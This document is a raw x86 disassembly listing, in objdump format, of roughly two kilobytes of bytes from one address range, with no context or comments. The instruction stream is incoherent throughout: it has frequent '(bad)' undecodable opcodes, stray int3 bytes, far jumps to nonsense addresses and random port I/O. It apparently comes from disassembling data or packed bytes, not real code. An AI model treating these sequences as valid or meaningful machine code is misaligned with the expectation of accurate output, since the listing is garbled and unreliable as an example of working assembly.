  411090:	inc    BYTE PTR [edi-0x63]
  411093:	dec    DWORD PTR [ecx-0x778c00b1]
  411099:	push   DWORD PTR [edi-0x1e]
  41109c:	(bad)  
  41109d:	inc    DWORD PTR [eax]
  41109f:	jmp    FWORD PTR [ebx]
  4110a1:	lods   al,BYTE PTR ds:[esi]
  4110a2:	mov    ecx,0xff1b8300
  4110a7:	mov    ebx,0xe996ff29
  4110ac:	cmp    edi,0xffffffff
  4110af:	dec    DWORD PTR [edx-0x3333f8e4]
  4110b5:	ins    DWORD PTR es:[edi],dx
  4110b6:	dec    DWORD PTR [esp+eax*1-0x1]
  4110ba:	stos   BYTE PTR es:[edi],al
  4110bb:	xchg   esi,eax
  4110bc:	(bad)  
  4110bd:	inc    DWORD PTR [eax]
  4110bf:	int3   
  4110c0:	cwde   
  4110c1:	push   es
  4110c2:	xchg   edi,eax
  4110c3:	add    bh,bh
  4110c5:	xlat   BYTE PTR ds:[ebx]
  4110c6:	sub    esi,0xffffff98
  4110c9:	jmp    FWORD PTR [eax]
  4110cb:	and    eax,DWORD PTR [eax]
  4110cd:	dec    esp
  4110cf:	jmp    FWORD PTR [edx+0x43]
  4110d2:	add    BYTE PTR [ebx+0x6800ffff],al
  4110d8:	loope  0x411063
  4110da:	sub    bh,ah
  4110dc:	inc    DWORD PTR [ebx-0x604c0034]
  4110e2:	xor    eax,DWORD PTR [ebx+0x3ecc2889]
  4110e8:	(bad)  
  4110ea:	out    dx,eax
  4110eb:	aas    
  4110ec:	mov    edi,edi
  4110ee:	mov    DWORD PTR [eax],eax
  4110f0:	cmc    
  4110f1:	xor    BYTE PTR [eax],dl
  4110f3:	(bad)  
  4110f4:	(bad)  
  4110f5:	jg     0x4110f7
  4110f7:	mov    WORD PTR [eax+0x0],ds
  4110fa:	pop    ss
  4110fb:	pushf  
  4110fc:	add    BYTE PTR [eax],al
  4110fe:	int3   
  4110ff:	and    DWORD PTR [edi],0xffffffdf
  411102:	ret    0x8300
  411105:	sbb    cl,ah
  411107:	mov    esi,0x2d95ff1e
  41110c:	or     esp,0xffffffff
  41110f:	jmp    DWORD PTR [eax+0x30]
  411112:	sbb    al,BYTE PTR [eax]
  411114:	int3   
  411115:	xor    edi,edi
  411117:	nop
  411118:	mov    edx,0xff6ef0ff
  41111d:	int3   
  41111e:	dec    DWORD PTR [ecx-0x7cb36a9d]
  411124:	push   esp
  411126:	push   DWORD PTR [edx]
  411128:	inc    edx
  411129:	int3   
  41112a:	fidiv  WORD PTR [edi]
  41112c:	(bad)  
  41112d:	(bad)  
  41112e:	inc    DWORD PTR [eax]
  411130:	sbb    BYTE PTR [ebx+0x6b],bl
  411133:	add    bh,bh
  411135:	add    BYTE PTR [eax],0xa8
  411138:	sbb    bh,bh
  41113a:	scas   al,BYTE PTR es:[edi]
  41113b:	mov    bl,0x0
  41113d:	inc    DWORD PTR [eax]
  41113f:	push   DWORD PTR [eax]
  411141:	fistp  QWORD PTR [ecx]
  411143:	add    BYTE PTR [eax],al
  411145:	xchg   ah,cl
  411147:	std    
  411148:	mov    ds:0xcc48d1ff,eax
  41114d:	add    bh,bh
  41114f:	inc    DWORD PTR [ebp-0x39]
  411152:	inc    eax
  411153:	mov    esp,ecx
  411155:	dec    esi
  411156:	mov    DWORD PTR [ecx+0x1f],esi
  411159:	int3   
  41115a:	xchg   cl,cl
  41115c:	(bad)  
  41115d:	inc    DWORD PTR [eax]
  41115f:	(bad)  
  411160:	in     al,dx
  411161:	out    0xc3,eax
  411163:	int3   
  411164:	(bad)  
  411165:	out    dx,al
  411166:	add    BYTE PTR [edx],dh
  411168:	sbb    eax,0xff6ee200
  41116d:	mov    DWORD PTR [ebx+0x11e4c6cc],eax
  411173:	inc    DWORD PTR [ebx+0x1f77ffae]
  411179:	sub    DWORD PTR [esi-0x33ffb5],0xffffff83
  411180:	push   ebx
  411181:	inc    edx
  411182:	outs   dx,DWORD PTR ds:[esi]
  411183:	(bad)  
  411184:	jmp    FWORD PTR [edx]
  411186:	dec    esp
  411188:	jmp    0xd71c8d
  41118d:	add    BYTE PTR [eax],al
  41118f:	int3   
  411190:	stos   BYTE PTR es:[edi],al
  411191:	fcom   st(3)
  411193:	add    bh,bh
  411195:	repz (bad) 
  411197:	in     al,dx
  411198:	add    edi,edi
  41119a:	push   ss
  41119b:	mov    bh,0xff
  41119d:	(bad)  
  41119e:	inc    DWORD PTR [ebx-0x9e2649]
  4111a4:	add    BYTE PTR ds:0xcc64fd83,bl
  4111aa:	outs   dx,DWORD PTR ds:[esi]
  4111ab:	leave  
  4111ac:	inc    DWORD PTR [eax]
  4111ae:	(bad)  
  4111af:	call   DWORD PTR [ebx-0x11]
  4111b2:	xchg   ebx,eax
  4111b3:	add    BYTE PTR [ecx-0x523a0079],cl
  4111b9:	add    BYTE PTR [ebx-0x337c37],dl
  4111bf:	(bad)  
  4111c0:	clc    
  4111c1:	add    al,0xc2
  4111c3:	(bad)  
  4111c4:	call   DWORD PTR [ebp-0x7c88a000]
  4111ca:	cmp    al,0x6
  4111cc:	int3   
  4111cd:	int3   
  4111ce:	add    BYTE PTR [eax],al
  4111d0:	test   eax,0xffcc4db9
  4111d5:	int3   
  4111d6:	call   DWORD PTR [ebp+ecx*1-0x4f5d00]
  4111dd:	inc    DWORD PTR [eax]
  4111df:	add    BYTE PTR [eax+0x64],ah
  4111e2:	mov    ah,0x0
  4111e4:	add    BYTE PTR [edi],bh
  4111e6:	add    BYTE PTR [edi-0x54a67c8b],bh
  4111ec:	add    bh,bh
  4111ee:	inc    DWORD PTR [ebx-0x2fb158]
  4111f4:	add    BYTE PTR [ecx+0x0],dh
  4111f7:	ror    DWORD PTR [edi+edi*8],cl
  4111fa:	jae    0x4111b5
  4111fc:	add    DWORD PTR [eax],0x0
  4111ff:	xor    DWORD PTR [edx],0xfffffff9
  411202:	fld    DWORD PTR [eax]
  411204:	sub    DWORD PTR [esi-0x34],0x5b
  411208:	ja     0x411209
  41120a:	pop    gs
  41120c:	inc    DWORD PTR [eax]
  41120e:	(bad)  
  41120f:	(bad)  
  411210:	mov    ebp,0xffffbdb4
  411215:	mov    eax,ds:0x1eacff
  41121a:	cs jg  0x41121d
  41121d:	inc    DWORD PTR [eax]
  41121f:	(bad)  
  411220:	in     al,dx
  411221:	inc    ecx
  411222:	aaa    
  411223:	int3   
  411224:	jmp    FWORD PTR [edi-0x7cf2cb00]
  41122a:	fidiv  WORD PTR [eax-0x7601]
  411230:	fisubr DWORD PTR [edx-0x26]
  411233:	or     esp,0xffffffa3
  411236:	dec    DWORD PTR [ecx+0xd]
  411239:	(bad)  
  41123a:	mov    edx,0xffffffa8
  41123f:	jmp    FWORD PTR [ebx+edi*4-0x45]
  411243:	add    ah,cl
  411245:	and    edi,edi
  411247:	fistp  WORD PTR ds:0xcce34083
  41124d:	add    DWORD PTR [ebx-0x458b7c01],0xffffff89
  411254:	int3   
  411255:	and    DWORD PTR [ebx-0xf00aae0],eax
  41125b:	js     0x41125d
  41125d:	add    bh,bh
  41125f:	call   FWORD PTR [ebx]
  411261:	cmp    BYTE PTR [edx-0x1],0x83
  411265:	add    eax,DWORD PTR [ebx-0x12005ae7]
  41126b:	jne    0x4111f0
  41126d:	add    BYTE PTR [ecx+0x3bcf9fff],cl
  411273:	add    BYTE PTR [ebx-0x18a300d1],al
  411279:	add    BYTE PTR [esi-0x7c04],al
  41127f:	sub    DWORD PTR [eax],0xffffffc1
  411282:	jp     0x411250
  411284:	add    BYTE PTR [ebx-0xb3c000],dh
  41128a:	loope  0x411241
  41128c:	int3   
  41128d:	add    bh,bh
  41128f:	and    DWORD PTR [edi],0xfffffff2
  411292:	xchg   edi,eax
  411293:	dec    esp
  411295:	xchg   ecx,eax
  411296:	add    BYTE PTR [edx-0x78],ah
  411299:	int3   
  41129a:	add    dl,ah
  41129c:	add    BYTE PTR [eax],al
  41129e:	add    bh,bh
  4112a0:	pop    ebx
  4112a1:	mov    ecx,DWORD PTR [esi+0x0]
  4112a4:	jmp    DWORD PTR [ebx+0x5392ff]
  4112aa:	mov    esp,DWORD PTR [ecx-0x7cff007d]
  4112b0:	ja     0x411233
  4112b2:	dec    eax
  4112b3:	inc    DWORD PTR [eax]
  4112b5:	nop
  4112b6:	mov    edx,esi
  4112b8:	es (bad) 
  4112ba:	fadd   QWORD PTR [ebx]
  4112bc:	add    bh,bh
  4112be:	inc    DWORD PTR [eax]
  4112c0:	lods   al,BYTE PTR ds:[esi]
  4112c1:	jno    0x4112d3
  4112c3:	(bad)  
  4112c4:	call   ecx
  4112c6:	call   DWORD PTR [ebp+0x74]
  4112c9:	mov    DWORD PTR [eax-0x767c00cd],edi
  4112cf:	int3   
  4112d0:	(bad)  
  4112d1:	cmp    edx,DWORD PTR [edx]
  4112d3:	cmp    edi,0x44
  4112d6:	add    cl,dh
  4112d8:	stos   DWORD PTR es:[edi],eax
  4112d9:	push   DWORD PTR [esi+eax*2+0x0]
  4112dd:	inc    DWORD PTR [ebx+0x758751cc]
  4112e3:	inc    DWORD PTR [ebx-0x51dc006c]
  4112e9:	inc    DWORD PTR [ebp-0x76]
  4112ec:	inc    DWORD PTR [eax]
  4112ee:	add    DWORD PTR [eax],0xfffffff6
  4112f1:	ret    
  4112f2:	xor    DWORD PTR [eax],eax
  4112f4:	xor    edi,0xffffff89
  4112f7:	ins    BYTE PTR es:[edi],dx
  4112f8:	aam    0xff
  4112fa:	jp     0x4112d0
  4112fc:	inc    DWORD PTR [eax]
  4112fe:	inc    DWORD PTR [ebx+0xc5f33]
  411304:	add    ah,dl
  411306:	add    BYTE PTR [edx],al
  411308:	fiadd  DWORD PTR [eax]
  41130a:	xchg   esp,eax
  41130b:	sub    al,0xff
  41130d:	add    BYTE PTR [ebx+0x168f3ff],al
  411313:	add    BYTE PTR [eax],al
  411315:	test   eax,0xff6316ff
  41131a:	int3   
  41131b:	adc    BYTE PTR [eax],al
  41131d:	mov    esp,ecx
  41131f:	int3   
  411320:	mov    edx,0x83ffac81
  411325:	sahf   
  411326:	push   esp
  411328:	pop    ecx
  411329:	push   DWORD PTR [eax+0xffccb8]
  41132f:	push   eax
  411331:	lahf   
  411332:	xchg   edi,edi
  411334:	add    BYTE PTR [eax],al
  411336:	(bad)  
  411337:	sti    
  411338:	cli    
  411339:	dec    DWORD PTR [eax]
  41133b:	out    0xff,eax
  41133d:	(bad)  
  41133e:	(bad)  
  41133f:	call   FWORD PTR [ebx+ecx*4+0x32]
  411343:	(bad)  
  411344:	push   esp
  411346:	cmp    DWORD PTR [ecx],0xffffffc8
  411349:	jmp    FWORD PTR [esi]
  41134b:	mov    WORD PTR [eax],es
  41134d:	cmp    edi,0xffffff89
  411350:	fdivrp st(4),st
  411352:	mov    ebp,0x7ecc00
  411357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411358:	pop    ebx
  411359:	call   FWORD PTR [edi]
  41135b:	inc    ecx
  41135c:	(bad)  
  41135d:	(bad)  
  41135e:	(bad)  
  41135f:	call   DWORD PTR [ebx+ebp*4]
  411362:	ins    DWORD PTR es:[edi],dx
  411363:	inc    DWORD PTR [eax]
  411365:	fdivp  st(7),st
  411367:	add    eax,0x8b0500ea
  41136c:	add    BYTE PTR [ecx+0x6bbb0000],cl
  411372:	pop    esp
  411373:	add    BYTE PTR [eax],al
  411375:	sbb    edi,edi
  411377:	xchg   BYTE PTR [esi],al
  411379:	jmp    edx
  41137b:	pop    eax
  41137c:	inc    DWORD PTR [eax]
  41137e:	(bad)  
  41137f:	push   DWORD PTR ds:0xffff31ef
  411385:	push   0x0
  411387:	lahf   
  411388:	add    BYTE PTR [eax],al
  41138a:	push   ss
  41138b:	mov    WORD PTR [eax],es
  41138d:	int3   
  41138e:	inc    DWORD PTR [eax]
  411390:	(bad)  
  411391:	jns    0x41131f
  411393:	inc    DWORD PTR [eax]
  411395:	or     cl,BYTE PTR [ecx-0x4a764c01]
  41139b:	int3   
  41139c:	add    BYTE PTR [eax],al
  41139e:	add    BYTE PTR [eax],al
  4113a0:	xchg   ebx,eax
  4113a1:	repnz cdq 
  4113a3:	dec    esp
  4113a5:	jmp    0x4113a7
  4113a7:	cmp    di,di
  4113aa:	outs   dx,DWORD PTR ds:[esi]
  4113ab:	inc    DWORD PTR [eax]
  4113ad:	add    BYTE PTR [eax],al
  4113af:	(bad)  
  4113b0:	sti    
  4113b1:	xchg   edi,eax
  4113b2:	and    al,0x0
  4113b4:	add    bh,dh
  4113b6:	call   edx
  4113b8:	dec    ecx
  4113b9:	jmp    DWORD PTR [esi-0xff0001]
  4113bf:	int3   
  4113c0:	fs scas al,BYTE PTR es:[edi]
  4113c2:	cmp    eax,0x8357ff00
  4113c7:	pop    ebx
  4113c8:	inc    eax
  4113c9:	inc    DWORD PTR [ebx-0x5f]
  4113cc:	cmp    edi,0x0
  4113cf:	jmp    DWORD PTR [edx-0x22]
  4113d2:	(bad)  
  4113d3:	inc    DWORD PTR [eax]
  4113d5:	clc    
  4113d6:	adc    DWORD PTR [ebp-0x4a],0xffffffff
  4113da:	mov    esi,0xcc8370
  4113df:	int3   
  4113e0:	push   esi
  4113e1:	and    al,0xb7
  4113e3:	inc    DWORD PTR [ebx-0x15a0037]
  4113e9:	mov    DWORD PTR [edx],esp
  4113eb:	imul   edi,edi,0xffffff83
  4113ee:	(bad)  
  4113ef:	call   FWORD PTR [eax]
  4113f1:	mov    ebp,0x7bff006e
  4113f6:	add    BYTE PTR [eax+0x286c0071],dl
  4113fc:	int3   
  4113fd:	mov    DWORD PTR [ebx-0x2415da01],eax
  411403:	add    BYTE PTR [ecx+0x5a41ff3c],cl
  411409:	or     DWORD PTR [edx],0x26
  41140c:	add    BYTE PTR [eax],al
  41140e:	(bad)  
  41140f:	(bad)  
  411410:	jl     0x411460
  411412:	lods   eax,DWORD PTR ds:[esi]
  411413:	add    bh,bh
  411415:	(bad)  
  411416:	(bad)  
  411417:	cld    
  411418:	hlt    
  411419:	add    al,cl
  41141b:	lods   eax,DWORD PTR ds:[esi]
  41141c:	inc    DWORD PTR [eax]
  41141e:	inc    DWORD PTR [eax]
  411420:	inc    ecx
  411421:	xor    BYTE PTR [ebx+0x3effff],ch
  411427:	inc    esp
  411428:	aaa    
  411429:	call   DWORD PTR [eax-0xff96]
  41142f:	call   FWORD PTR [ebx]
  411431:	pusha  
  411432:	test   BYTE PTR [ebx-0x647c3434],al
  411438:	and    bh,bh
  41143a:	mov    DWORD PTR [esp+ecx*8],ebp
  41143d:	cmp    edi,0xffffffff
  411440:	push   esp
  411441:	push   eax
  411442:	aad    0xff
  411444:	add    BYTE PTR [edx+0x0],dh
  411447:	scas   al,BYTE PTR es:[edi]
  411448:	jbe    0x411416
  41144a:	mov    eax,DWORD PTR [eax-0x1]
  41144d:	add    bh,bh
  41144f:	mov    ebx,ebp
  411451:	sbb    al,0x97
  411453:	dec    DWORD PTR [ecx-0x6b89ff3d]
  411459:	jmp    DWORD PTR [ebx+0xff009d]
  41145f:	int3   
  411460:	mov    ah,0x8f
  411462:	xchg   esi,eax
  411463:	mov    DWORD PTR [eax],eax
  411465:	aam    0xcc
  411467:	sbb    BYTE PTR [edi],cl
  411469:	call   FWORD PTR [ebx]
  41146b:	xchg   esi,eax
  41146c:	add    DWORD PTR [ebx-0x765d007d],0x65
  411473:	int3   
  411474:	inc    DWORD PTR [ecx]
  411476:	add    ah,bh
  411478:	add    edi,edi
  41147a:	test   DWORD PTR [ebx],esi
  41147c:	add    BYTE PTR [ebx-0x7760001],al
  411482:	dec    ebx
  411483:	(bad)  
  411484:	jmp    FWORD PTR [edx]
  411486:	jmp    FWORD PTR [eax-0x337eff04]
  41148c:	add    BYTE PTR [eax],al
  41148e:	int3   
  41148f:	int3   
  411490:	test   BYTE PTR [esi+0x5effcc9b],bl
  411496:	inc    edx
  411498:	mov    cl,ah
  41149a:	loope  0x411488
  41149c:	(bad)  
  41149d:	inc    DWORD PTR [eax]
  41149f:	(bad)  
  4114a0:	(bad)  
  4114a2:	and    eax,0xff9b0083
  4114a7:	push   ebp
  4114a8:	je     0x411476
  4114aa:	pop    eax
  4114ab:	add    BYTE PTR ds:[eax],al
  4114ae:	mov    esp,ecx
  4114b0:	call   0x88:0xffff63d6
  4114b7:	jge    0x4114fc
  4114b9:	jmp    DWORD PTR [edx-0x33003c]
  4114bf:	add    BYTE PTR [ecx+0x895106],bh
  4114c5:	jmp    0xff866fca
  4114ca:	ss push es
  4114cc:	inc    DWORD PTR [eax]
  4114ce:	inc    DWORD PTR [eax]
  4114d0:	adc    eax,0xffda29
  4114d5:	mov    bl,0x83
  4114d7:	push   0xffffff93
  4114d9:	dec    edi
  4114db:	fild   DWORD PTR [eax]
  4114dd:	add    BYTE PTR [ebx-0xf786001],al
  4114e3:	cmp    edi,0x5f
  4114e6:	mov    DWORD PTR [edi+0x3dbd0065],ebx
  4114ec:	(bad)  
  4114ed:	dec    DWORD PTR [ecx-0x7fffca00]
  4114f3:	inc    DWORD PTR [eax]
  4114f5:	(bad)  
  4114f7:	mov    al,0x8b
  4114f9:	int3   
  4114fa:	mov    esi,0xccff00ad
  4114ff:	add    BYTE PTR [eax+0xc],cl
  411502:	sub    BYTE PTR [eax],al
  411504:	mov    DWORD PTR [edi+edi*8+0x6d],ebx
  411508:	sub    eax,0xfdda00
  41150d:	add    bh,bh
  41150f:	add    DWORD PTR [esi+ebx*2-0x257cffa8],0x0
  411517:	fsub   st(2),st
  411519:	cmp    DWORD PTR [edx-0x7c0000ea],0x0
  411520:	push   0x18
  411522:	jb     0x4114a7
  411524:	add    BYTE PTR [eax-0x33f20301],ah
  41152a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41152b:	aas    
  41152c:	inc    DWORD PTR [eax]
  41152e:	or     DWORD PTR [ecx-0xe60a5f],0xffffffff
  411535:	mov    dh,0x83
  411537:	leave  
  411538:	repz call DWORD PTR [edx-0x15]
  41153c:	inc    DWORD PTR [ebx-0x39600000]
  411542:	inc    DWORD PTR [bx+si]
  411545:	pop    ebp
  411546:	int3   
  411547:	pop    ss
  411548:	int    0x0
  41154a:	dec    esi
  41154b:	or     cl,BYTE PTR [ecx+0x668383ff]
  411551:	lock jns 0x4114d7
  411554:	cmp    DWORD PTR [edx+0x9f4aff],0xffffff9d
  41155b:	ins    BYTE PTR es:[edi],dx
  41155c:	add    bh,bh
  41155e:	inc    DWORD PTR [eax]
  411560:	jmp    DWORD PTR [ebp-0x3200ff0b]
  411566:	mov    DWORD PTR [esi-0x43],edi
  411569:	inc    DWORD PTR [ebx+eax*2]
  41156c:	int3   
  41156d:	cmp    edi,0xffffff83
  411570:	or     esp,DWORD PTR [edi+0x4b]
  411573:	add    ah,cl
  411575:	mov    ch,0x83
  411577:	sbb    eax,0x68af839c
  41157c:	mov    DWORD PTR [ecx-0x6c377c01],ecx
  411582:	cmp    edi,0x85ffd000
  411588:	inc    edx
  411589:	int3   
  41158a:	push   ebx
  41158b:	ret    
  41158c:	add    BYTE PTR [ecx-0x2182ff7d],cl
  411592:	xchg   ecx,eax
  411593:	dec    esp
  411595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411596:	dec    DWORD PTR [eax-0x69b3ffaf]
  41159c:	mov    edi,edi
  41159e:	int3   
  41159f:	push   DWORD PTR [ebp-0x6c]
  4115a2:	imul   eax,DWORD PTR [eax],0xffffffff
  4115a5:	add    BYTE PTR [eax],0xa
  4115a8:	inc    edi
  4115a9:	add    cl,cl
  4115ab:	scas   al,BYTE PTR es:[edi]
  4115ac:	dec    esp
  4115ae:	add    DWORD PTR [ebx+0xb124dd],0xffffffff
  4115b5:	add    eax,0x832c67ff
  4115ba:	mov    al,0x19
  4115bc:	add    bh,bh
  4115be:	dec    esp
  4115c0:	bnd jg 0x4115e6
  4115c3:	(bad)  
  4115c4:	call   FWORD PTR [eax-0x7c616001]
  4115ca:	rcl    BYTE PTR [esi-0x1],cl
  4115cd:	add    bh,bh
  4115cf:	adc    DWORD PTR [esi+0x5e],0x3e
  4115d3:	dec    esp
  4115d5:	iret   
  4115d6:	push   DWORD PTR [edi+eiz*2]
  4115d9:	add    BYTE PTR [ecx+0x17],cl
  4115dc:	add    BYTE PTR [eax],al
  4115de:	(bad)  
  4115df:	jmp    FWORD PTR [ebx]
  4115e1:	push   ecx
  4115e2:	enter  0xffff,0x50
  4115e6:	add    ah,al
  4115e8:	out    0x83,al
  4115ea:	or     al,0xb1
  4115ec:	(bad)  
  4115ed:	(bad)  
  4115ee:	inc    DWORD PTR [eax]
  4115f0:	jno    0x41164b
  4115f2:	mov    ebx,0x834eff00
  4115f7:	mov    dh,0xb6
  4115f9:	xor    DWORD PTR ds:0xffff4d,0x0
  411600:	mov    esp,0xff001608
  411605:	aam    0x83
  411607:	stos   BYTE PTR es:[edi],al
  411608:	loop   0x41160a
  41160a:	sbb    eax,0xffffffa8
  41160f:	int3   
  411610:	stc    
  411611:	or     esp,ebx
  411613:	mov    DWORD PTR [eax],eax
  411615:	ror    BYTE PTR [ecx-0x313343b6],0x27
  41161c:	add    BYTE PTR [ecx-0x515c0000],cl
  411622:	mov    eax,ds:0xff6000cc
  411627:	ins    BYTE PTR es:[edi],dx
  411628:	repnz dec esp
  41162b:	push   cs
  41162c:	add    BYTE PTR [ebx+0x2d750000],al
  411632:	fild   WORD PTR [eax]
  411634:	add    BYTE PTR [ebx-0x7643257d],dl
  41163a:	pop    esi
  41163b:	pop    eax
  41163c:	int3   
  41163d:	add    bh,bh
  41163f:	int3   
  411640:	inc    esp
  411641:	daa    
  411642:	aas    
  411643:	add    BYTE PTR [eax],al
  411645:	loope  0x411646
  411647:	inc    ecx
  411648:	and    edi,edi
  41164a:	popf   
  41164b:	bound  ecx,QWORD PTR [ecx+0x14ccff89]
  411651:	xor    esi,DWORD PTR [esi]
  411653:	(bad)  
  411654:	push   eax
  411656:	inc    DWORD PTR [ebx]
  411658:	adc    edi,edi
  41165a:	fwait
  41165b:	daa    
  41165c:	add    BYTE PTR [ecx+0x7e470089],cl
  411662:	dec    ebx
  411663:	add    bh,bh
  411665:	cld    
  411666:	call   DWORD PTR [esi+0x69]
  411669:	add    dh,bh
  41166b:	popf   
  41166c:	inc    DWORD PTR [ebx+0x6364ffcc]
  411672:	mov    ebp,0x836d8983
  411677:	cld    
  411678:	in     eax,0xff
  41167a:	adc    ah,BYTE PTR [edi+0x0]
  41167d:	(bad)  
  41167e:	inc    DWORD PTR [ebx-0x76335543]
  411684:	add    al,bl
  411686:	sbb    DWORD PTR [ebp-0x72ea7c58],0xffffffff
  41168d:	(bad)  
  41168e:	inc    DWORD PTR [ebx-0x7cebdbee]
  411694:	(bad)  
  411695:	fld    DWORD PTR [eax]
  411697:	repz add BYTE PTR [bx+di],bh
  41169b:	fcos   
  41169d:	mov    DWORD PTR [ebx-0x378ae67d],eax
  4116a3:	inc    DWORD PTR [eax]
  4116a5:	jl     0x41162a
  4116a7:	and    ch,BYTE PTR [ecx+0x649589]
  4116ad:	int3   
  4116ae:	(bad)  
  4116af:	jmp    DWORD PTR [edi+edi*2+0x45]
  4116b3:	int3   
  4116b4:	add    ah,ah
  4116b6:	add    BYTE PTR [ecx+0x734b004e],al
  4116bc:	dec    esp
  4116be:	dec    esp
  4116c0:	push   ebp
  4116c1:	shl    DWORD PTR [esi],0xcc
  4116c4:	call   FWORD PTR [ecx-0x505c00]
  4116ca:	push   0xff8371
  4116cf:	int3   
  4116d0:	or     DWORD PTR [eax+edi*8+0x0],ebp
  4116d4:	cmp    DWORD PTR [edx-0x6dd700],0xffffff82
  4116db:	mov    BYTE PTR [eax],al
  4116dd:	(bad)  
  4116de:	(bad)  
  4116df:	push   DWORD PTR [eax-0x78]
  4116e2:	pop    edi
  4116e3:	add    DWORD PTR [eax],0xfffffffa
  4116e6:	call   DWORD PTR [ebx]
  4116e8:	jmp    0x0:0xff8edb83
  4116ef:	add    BYTE PTR [ebx-0xeabb],dh
  4116f5:	mov    cl,0x83
  4116f7:	jmp    0xccff:0x74bd89f6
  4116fe:	int3   
  4116ff:	and    DWORD PTR [esi],0xffffff96
  411702:	add    BYTE PTR fs:[eax],al
  411705:	lods   al,BYTE PTR ds:[esi]
  411706:	(bad)  
  411707:	mov    eax,0x475cccf1
  41170c:	int3   
  41170d:	cmp    edi,0x0
  411710:	hlt    
  411711:	hlt    
  411712:	nop
  411713:	add    BYTE PTR [ecx+0x1a5f007e],cl
  411719:	(bad)  
  41171a:	cmp    BYTE PTR [esi-0x100],ah
  411720:	sbb    DWORD PTR [eax],0x1eff8377
  411726:	add    BYTE PTR [eax+0x22f7cc22],al
  41172c:	add    bh,bh
  41172e:	add    BYTE PTR [eax],al
  411730:	bound  edx,QWORD PTR [edi+edi*8-0x7c930001]
  411737:	push   eax
  411738:	lods   eax,DWORD PTR ds:[esi]
  411739:	mov    DWORD PTR [eax+0x5e],edi
  41173c:	inc    DWORD PTR [eax]
  41173e:	add    BYTE PTR [ebx-0x33b77766],al
  411744:	int3   
  411745:	arpl   WORD PTR [eax],ax
  411747:	pusha  
  411748:	jmp    0xffa7934c
  41174d:	mov    DWORD PTR [ecx+0x69b61bff],ecx
  411753:	add    ah,cl
  411755:	cmp    bh,0xce
  411758:	popf   
  411759:	mov    esi,edi
  41175b:	inc    DWORD PTR [eax]
  41175d:	add    bh,bh
  41175f:	cmp    ebx,0x16
  411762:	ret    0xffff
  411765:	jae    0x411766
  411767:	dec    ecx
  411768:	ins    BYTE PTR es:[edi],dx
  411769:	int3   
  41176a:	push   es
  41176b:	pop    eax
  41176c:	add    bh,bh
  41176e:	(bad)  
  41176f:	inc    eax
  411771:	(bad)  
  411772:	jge    0x411773
  411774:	push   DWORD PTR [ecx-0x952077]
  41177a:	loopne 0x411762
  41177c:	(bad)  
  41177d:	(bad)  
  41177e:	inc    DWORD PTR [ebx-0xcd18b5]
  411784:	add    DWORD PTR [ecx+ecx*4-0xa],0x9
  411789:	jmp    DWORD PTR [ecx]
  41178b:	jecxz  0x41178c
  41178d:	add    DWORD PTR [eax],0xffffffff
  411790:	icebp  
  411791:	sti    
  411792:	adc    eax,0xff158383
  411797:	adc    al,0xfc
  411799:	dec    DWORD PTR [esi]
  41179b:	mov    bh,0x0
  41179d:	(bad)  
  41179e:	inc    DWORD PTR [eax]
  4117a0:	daa    
  4117a1:	or     BYTE PTR [esi-0x1],dh
  4117a4:	dec    DWORD PTR [esi-0x7d]
  4117a7:	xor    edx,DWORD PTR ds:0x56b183
  4117ad:	mov    esp,ecx
  4117af:	add    BYTE PTR [ebp+0x28],bl
  4117b2:	pop    eax
  4117b3:	add    bh,bh
  4117b5:	pop    ecx
  4117b6:	add    BYTE PTR [esi+0x20],cl
  4117b9:	push   DWORD PTR [edx-0x4e]
  4117bf:	call   FWORD PTR [esi-0x3a]
  4117c2:	(bad)  
  4117c3:	int3   
  4117c4:	adc    DWORD PTR [edi],0xffffffff
  4117c7:	dec    ebp
  4117c8:	push   es
  4117c9:	or     DWORD PTR [eax-0x53],0x0
  4117cd:	mov    DWORD PTR [ebx+0x534449ff],eax
  4117d3:	add    bh,bh
  4117d5:	pop    ebx
  4117d6:	add    al,cl
  4117d8:	sub    bh,bh
  4117da:	xchg   esi,eax
  4117db:	inc    eax
  4117dc:	(bad)  
  4117dd:	inc    DWORD PTR [eax]
  4117df:	int3   
  4117e0:	pop    ss
  4117e1:	(bad)  
  4117e2:	repz add DWORD PTR [eax],0x33
  4117e6:	or     ecx,0x27
  4117e9:	add    BYTE PTR [ebx-0x68],al
  4117ec:	add    BYTE PTR [eax],al
  4117ee:	or     DWORD PTR [ecx-0x33d8c965],0xffffffff
  4117f5:	cmc    
  4117f6:	add    BYTE PTR [edi-0x63c0053],bh
  4117fc:	int3   
  4117fd:	mov    edi,edi
  4117ff:	adc    esi,0x73
  411802:	les    eax,FWORD PTR [eax]
  411804:	(bad)  
  411805:	clc    
  411806:	jmp    DWORD PTR [esi-0x4a5900fd]
  41180c:	add    ah,cl
  41180e:	add    bh,bh
  411810:	push   ss
  411811:	add    esp,DWORD PTR [esi+0x838900]
  411817:	addr16 push ss
  411819:	add    BYTE PTR [edx-0x7],bh
  41181c:	(bad)  
  41181d:	dec    DWORD PTR [ecx+0x54dc09ff]
  411823:	dec    DWORD PTR [ecx+0x49a3ff7d]
  411829:	jmp    FWORD PTR [ecx-0xffff42]
  41182f:	(bad)  
  411830:	js     0x4117d5
  411832:	adc    bh,bh
  411834:	int3   
  411835:	xchg   edi,eax
  411836:	or     ecx,0x75
  411839:	int3   
  41183a:	aaa    
  41183b:	loope  0x41183c
  41183d:	mov    DWORD PTR [ecx-0x7277b200],ecx
  411843:	add    BYTE PTR [eax],al
  411845:	idiv   edi
  411847:	ror    DWORD PTR [edi+0x0],1
  41184a:	xchg   esi,eax
  41184b:	sub    edi,edi
  41184d:	cmp    edi,0x0
  411850:	mov    ebp,edx
  411852:	das    
  411853:	add    bh,bh
  411855:	add    al,0xcc
  411857:	retf   
  411858:	add    al,0x89
  41185a:	fisub  DWORD PTR [ebp-0x77]
  41185d:	inc    DWORD PTR [eax]
  41185f:	and    DWORD PTR [ebp+ecx*1-0x7900ff82],0xffffffff
  411867:	and    DWORD PTR [edi-0x241c01],esi
  41186d:	or     DWORD PTR [ecx+0xd5432ff],0x0
  411874:	add    esp,0xffffff83
  411877:	adc    BYTE PTR [edx+0x0],cl
  41187a:	js     0x41189c
  41187c:	add    BYTE PTR [ebx+0x540d0000],al
  411882:	sub    eax,0xcc710000
  411887:	inc    esp
  411888:	dec    eax
  411889:	mov    DWORD PTR [edi+ebx*4],esp
  41188c:	(bad)  
  41188d:	dec    DWORD PTR [ecx+0x442f1a00]
  411893:	cmp    edi,0xffffffe6
